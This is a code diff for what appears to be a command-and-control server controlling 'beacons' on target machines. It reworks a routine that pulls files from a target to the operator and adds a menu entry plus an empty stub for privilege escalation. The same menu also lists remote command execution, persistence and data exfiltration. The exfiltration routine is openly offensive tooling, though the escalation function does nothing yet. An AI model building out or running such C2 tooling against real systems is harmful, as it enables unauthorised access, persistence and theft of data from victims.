@@ -95,14 +95,17 @@ def beacon_file_transfer(client_socket, client_address):
             # Receiving file from client
             try:
                 _, file_name = command.split(" ", 1)
-                client_socket.send(f"recv {file_name}".encode())
-                with open(file_name, "wb") as file:
-                    while True:
-                        chunk = client_socket.recv(1024)
-                        if chunk == b"DONE":
-                            break
-                        file.write(chunk)
-                print(f"File '{file_name}' received successfully.")
+                ack = client_socket.recv(1024).decode()
+                if ack == "READY":
+                    print("recv ready")
+                    with open(file_name, "wb") as file:
+                        while True:
+                            chunk = client_socket.recv(1024)
+                            if b"DONE" in chunk:
+                                file.write(chunk.split(b"DONE")[0])
+                                break
+                            file.write(chunk)
+                    print(f"File '{file_name}' received successfully.")
             except Exception as e:
                 print(f"Error: {e}")
         else:
@@ -111,6 +114,10 @@ def beacon_file_transfer(client_socket, client_address):
         
         time.sleep(1)
 
+
+
+def privilege_up(client_socket, client_address):
+    print("Priviledge Escalation")
 
 
 
@@ -146,7 +153,8 @@ def manage_client(client_socket, client_address):
             
             beacon_file_transfer(client_socket, client_address)    
 
-            
+        if int(response) == 3:
+            privilege_up(client_socket, client_address)
         # client_socket.send(response.encode('utf-8'))
     except ConnectionResetError:
         print("Connection Error")
@@ -200,7 +208,7 @@ def beacon_menu():
     print("Select an option for the beacon:")
     print("1. Execute Commands on Target")
     print("2. File Transfer")
-    print("3. Download Files")
+    print("3. Priviledge Escalation")
     print("4. Persistence Mechanism Setup")
     print("5. Data Exfiltration")
     print("6. Spawn New Processes")
